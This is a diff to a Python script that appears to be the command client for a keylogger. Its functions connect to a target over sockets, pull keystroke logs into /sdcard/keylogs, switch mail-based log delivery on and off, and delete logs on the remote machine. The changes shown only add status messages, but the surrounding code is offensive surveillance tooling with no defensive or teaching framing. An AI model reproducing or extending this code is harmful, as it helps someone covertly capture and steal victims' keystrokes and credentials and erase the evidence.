@@ -139,7 +139,7 @@ def get_log(target, PORT, intent):
             l = s.recv(1024)
         f.close()
         s.close()
-        print("[+] Log received")
+        print("[+] Log received to /sdcard/keylogs")
     except ConnectionRefusedError:
         print("[-] Server went offline")
 
@@ -152,6 +152,7 @@ def mail_off(target, PORT, intent):
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
         s.close()
+        print("[+] Mail turned off on the server")
     except ConnectionRefusedError:
         print("[-] Server went offline")
 
@@ -164,6 +165,7 @@ def mail_on(target, PORT, intent):
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
         s.close()
+        print("[+] Mail turned on on the server")
     except ConnectionRefusedError:
         print("[-] Server went offline")
 
@@ -176,6 +178,7 @@ def rm_log(target, PORT, intent):
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
         s.close()
+        print("[+] Log has been removed on the server")
     except ConnectionRefusedError:
         print("[-] Server went offline")
 
